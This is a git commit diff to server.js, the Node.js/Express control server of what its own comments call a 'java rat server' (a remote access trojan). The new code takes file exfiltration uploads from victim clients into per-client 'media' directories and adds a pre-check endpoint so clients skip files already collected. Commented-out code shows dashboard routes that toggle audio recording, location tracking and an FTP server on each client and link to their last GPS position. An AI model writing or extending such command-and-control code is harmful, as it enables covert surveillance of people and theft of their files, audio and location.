8f08b7f3fb28179d58bcea44dc49f93bbaa242c0
stofstik <verstegen.daan@gmail.com>
2016-08-16 19:42:13 +0200

    Let the client check if we want the file before uploading

--- server.js
+++ server.js
@@ -8,199 +8,162 @@ var mongoose = require('mongoose');
 var morgan = require('morgan');
 var multer = require('multer');
 var mkdirp = require('mkdirp');
+var fs     = require('fs');
+
+// The directory where each client dir is saved
+var controlServerDirectory = '/../';
+// The directory name inside the client dir
+var clientFileDirectoryName = 'media';
+// The max file size to accept from a client in bytes
+var maxFileSize = 10 * 1024 * 1024;
 
 var storage = multer.diskStorage({
-    destination: function(req, file, cb) {
+    destination: function(req, file, callback) {
         // For use with the java rat server we... located in the parent directory
         // Thus we use /../ and save in the client id's directory
-        var directory = path.join(__dirname, '/../', req.params.clientId);
+        var directory = path.join(__dirname, controlServerDirectory, req.params.clientId, clientFileDirectoryName);
         // Ensure dir exists, it probabaly already exists when using java rat server
         mkdirp.sync(directory);
-        cb(null, directory);
+        callback(null, directory);
     },
-    filename: function(req, file, cb) {
+    filename: function(req, file, callback) {
         // Save the file with the name it had on the client side
-        cb(null, file.originalname);
+        callback(null, file.originalname);
     }
 });
 var upload = multer({
     storage: storage,
     limits: {
         // Filesize in bytes
-        fileSize: 128 * 1024 * 1024
+        fileSize: maxFileSize
+    },
+    fileFilter: (req, file, callback) => {
+        // Get file info from client
+        var fileName = file.originalname;
+        // Get our working directory
+        var directory = path.join(__dirname, controlServerDirectory, req.params.clientId, clientFileDirectoryName);
+        // Check if the file already exists
+        fileExists(directory, fileName, (exists) => {
+            if(exists){
+                // File already exists, do not accept this upload
+                var error = req.params.clientId + ' ' + fileName + ' exists ';
+                callback(error, false);
+            } else {
+                // File does not exist, accept it
+                console.log('%s Receiving: %s', req.params.clientId, fileName);
+                callback(null, true);
+            }
+        });
     }
-    // The file identifier expected for the client, thes must match
+    // The file identifier expected for the client, these must match
 }).single('tehAwesomeFile');
 
 var app = express();
 var PORT_NUMBER = process.argv[2]; // to start: "node server.js [port]"
 
 // Simple connection logger
-app.use(morgan(':date[clf] :remote-addr :url'));
+// app.use(morgan(':date[clf] :remote-addr :url'));
 
 /*
  * A client is uploading a file
  */
 app.post('/postFile/:clientId', (req, res) => {
-        upload(req, res, (err) => {
-            if (err) {
-                console.log('Error receiving from %s: %s', req.params.clientId, req.file.originalname);
-                res.send("Error: " + err);
-            }
-            console.log('Success receiving from %s: %s', req.params.clientId, req.file.originalname);
-            res.send("Received: " + req.file.originalname);
-        });
+    upload(req, res, (err) => {
+        if (err) {
+            console.log(err);
+            res.status(500).send(err);
+        } else {
+            res.status(200).send(req.file.originalname);
+        }
     });
+});
+
+app.get('/acceptFile/:clientId', (req, res) => {
+    var fileName = req.query.fileName;
+    var fileSize = req.query.fileSize;
+    var directory = path.join(__dirname, controlServerDirectory, req.query.clientId, clientFileDirectoryName);
+    fileExists(directory, fileName, (exists) => {
+        if(exists){
+            res.status(500).send(fileName + ' Already exists on server');
+        } else if (fileSize > maxFileSize){
+            res.status(500).send(fileName + ' Too large');
+        } else {
+            res.status(200).send();
+        }
+    });
+});
 
 /*
- * app.post('/handshake/:id/:version/:package/:ssid/:isAudioStarted/:isLocationStarted/:ftpServerStarted/:location',
- *     function(req, res) {
+ * // Receive status and respond with actions to take on the client
+ * app.get('/status/:clientId', (req, res) => {
+ *     var clientId          = req.params.clientId;
+ *     var isLocationStarted = req.query.isLocationStarted;
+ *     var isAudioStarted    = req.query.isAudioStarted;
  *
- *         connectionManager.add(req.params.id, req.params.isLocationStarted,
- *             req.params.isAudioStarted, req.params.ftpServerStarted,
- *             req.params.location);
- *
- *         var connection = connectionManager.getLastById(req.params.id);
- *         var actions = {
- *             startAudio: connection.audio,
- *             startLocation: connection.locationStarted,
- *             startFTPServer: connection.ftpServ
- *         };
- *
- *         res.send(actions);
- *     });
- *
- * app.get('/dashboard', function(req, res) {
- *     var head = "<html> <head> </head> <body> ";
- *     var content = "";
- *     var script = "";
- *     script += "<script>";
- *     script += "setInterval(function() {location.reload();}, 5000);";
- *     script += "</script>";
- *     var connections = connectionManager.connections;
- *     for (var i = 0; i < connections.length; i++) {
- *         // first link to detail view
- *         content += "\r\n<p><a href=\"";
- *         content += "/detailView/";
- *         content += connections[i].id;
- *         content += "\">";
- *         content += connections[i].id;
- *         content += " " + connections[i].age;
- *         content += "</a>";
- *         // link to start stop location
- *         content += " " + "location started: ";
- *         content += "<a href=\"";
- *         content += "/toggleLocation/";
- *         content += connections[i].id;
- *         content += "\">";
- *         content += " " + connections[i].locationStarted;
- *         content += "</a>";
- *         // link to start stop audio
- *         content += " " + "audio started: ";
- *         content += "<a href=\"";
- *         content += "/toggleAudio/";
- *         content += connections[i].id;
- *         content += "\">";
- *         content += " " + connections[i].audio;
- *         content += "</a>";
- *         // link to start stop ftp server
- *         content += " " + "ftpServer started: ";
- *         content += "<a href=\"";
- *         content += "/toggleFtpServer/";
- *         content += connections[i].id;
- *         content += "\">";
- *         content += " " + connections[i].ftpServ;
- *         content += "</a>";
- *         content += " " + "last location: ";
- *         content += "<a target=\"_blank\" href=\"";
- *         content += "http://maps.google.com/maps?q=loc:";
- *         content += connections[i].location;
- *         content += "\">";
- *         content += " " + connections[i].location;
- *         content += "</a>";
- *     }
- *     var foot = "\r\n</body> </html>";
- *     var page = head + content + script + foot;
- *     res.send(page);
+ *     connectionManager.addUpdate(clientId, isLocationStarted, isAudioStarted);
+ *     res.send(connectionManager.getLastById(clientId));
  * });
  *
- * app.get('/detailView/:id', function(req, res) {
- *     var head = "<html> <head> </head> <body> ";
- *     var connection = connectionManager.getLastById(req.params.id);
- *     var content = connection;
- *     var foot = "\r\n</body> </html>";
- *     var page = head + content + foot;
- *     res.send(page);
+ * app.get('/connections', (req, res) => {
+ *     res.send(connectionManager.connections);
  * });
  *
- * app.get('/toggleFtpServer/:id', function(req, res) {
- *     var connection = connectionManager.getLastById(req.params.id);
- *     if (connection.ftpServ === true || connection.ftpServ === "true") {
- *         connection.ftpServ = false;
- *     } else {
- *         connection.ftpServ = true;
- *     }
- *     res.redirect('/dashboard');
- * });
- *
- * app.get('/toggleLocation/:id', function(req, res) {
- *     var connection = connectionManager.getLastById(req.params.id);
- *     if (connection.locationStarted === true || connection.locationStarted === "true") {
- *         connection.locationStarted = false;
- *     } else {
- *         connection.locationStarted = true;
- *     }
- *     res.redirect('/dashboard');
- * });
- *
- * app.get('/toggleAudio/:id', function(req, res) {
- *     var connection = connectionManager.getLastById(req.params.id);
- *     if (connection.audio === true || connection.audio === "true") {
- *         connection.audio = false;
- *     } else {
- *         connection.audio = true;
- *     }
- *     res.redirect('/dashboard');
- * });
+ * function Connection(clientId, isLocationStarted, isAudioStarted) {
+ *     this.clientId          = clientId;
+ *     this.age               = new Date().getTime();
+ *     this.isAudioStarted    = isLocationStarted;
+ *     this.isLocationStarted = isAudioStarted;
+ * }
  *
  * var connectionManager = {
  *     connections: [],
- *     add: function(id, locationStarted, audio, ftpServ, location) {
- *         if (this.getLastById(id) === undefined) {
- *             this.connections.push({
- *                 id: id,
- *                 age: Date.now(),
- *                 locationStarted: locationStarted,
- *                 audio: audio,
- *                 ftpServ: ftpServ,
- *                 location: location
- *             });
+ *     addUpdate: function(clientId, isLocationStarted, isAudioStarted) {
+ *         // Check if connection exists
+ *         if (this.getLastById(clientId) === undefined) {
+ *             this.connections.push(new Connection(clientId, isLocationStarted, isAudioStarted));
  *         } else {
- *             this.getLastById(id).age = Date.now();
- *             this.getLastById(id).location = location;
+ *             this.getLastById(clientId).age = new Date().getTime();
+ *             this.getLastById(clientId).isLocationStarted = isLocationStarted;
+ *             this.getLastById(clientId).isAudioStarted = isAudioStarted;
  *         }
+ *         // Remove dead connections
  *         this.clean();
  *     },
  *     clean: function() {
  *         var timeout = 60000;
  *         for (var i = 0; i < this.connections.length; i++) {
  *             var count = 0;
- *             if (this.connections[i].age < (Date.now() - timeout)) {
+ *             if (this.connections[i].age < (new Date().getTime() - timeout)) {
  *                 var index = this.connections.indexOf(this.connections[i]);
  *                 this.connections.splice(index, 1);
  *                 count++;
  *             }
  *         }
  *     },
- *     getLastById: function(id) {
+ *     getLastById: function(clientId) {
  *         for (var i = this.connections.length - 1; i >= 0; i--) {
- *             if (this.connections[i].id === id) {
+ *             if (this.connections[i].clientId === clientId) {
  *                 return this.connections[i];
  *             }
  *         }
  *     }
  * };
  */
+
+function fileExists(dir, fileName, callback) {
+    fs.stat(path.join(dir, fileName), (err, stats) => {
+        if (err === null) {
+            callback(true);
+        } else if (err.code === 'ENOENT') {
+            callback(false);
+        } else {
+            console.log(err.code);
+            callback(false);
+        }
+    });
+}
+
+
 
 // start the server
 var server = app.listen(PORT_NUMBER, function() {
